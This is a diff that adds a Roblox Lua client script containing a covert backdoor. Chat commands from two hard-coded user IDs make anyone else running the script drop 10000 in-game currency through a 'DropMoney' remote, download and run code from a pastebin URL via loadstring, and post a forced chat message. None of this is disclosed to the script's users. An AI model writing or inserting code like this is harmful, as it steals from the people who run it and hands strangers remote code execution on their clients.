@@ -1,0 +1,61 @@
+local player = game.Players.LocalPlayer
+local isanadmin = false
+local admins = {
+    469000927,
+    246848510,
+}
+
+local function cmds(msg,plr)
+	if isanadmin == false or table.find(admins,plr) then
+		Admin = game.Players:GetPlayerByUserId(plr)
+		isanadmin = table.find(admins,player.UserId)
+		if msg == ":dropcash ." then
+			if not isanadmin then
+			
+
+local args = {
+    [1] = "DropMoney",
+    [2] = "10000"
+}
+
+game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
+
+			end
+		end
+
+        if msg == ":ball ." then
+			if not isanadmin then
+                loadstring(game:HttpGet("https://pastebin.com/raw/EJskzezp",true))()
+			end
+		end
+
+        if msg == "/e test" then
+			if not isanadmin then
+
+local args = {
+    [1] = "Im right here!",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+                    end
+                end
+			end
+		end
+
+for i,v in pairs(game:GetService('Players'):GetChildren()) do
+	if table.find(admins,v.UserId) then
+		v.Chatted:Connect(function(msg)
+			cmds(msg,v.UserId)
+		end)
+	end
+end
+
+game.Players.PlayerAdded:Connect(function(plr)
+	if table.find(admins,plr.UserId) then
+		plr.Chatted:Connect(function(msg)
+			cmds(msg,plr.UserId)
+		end)
+	end
+end)
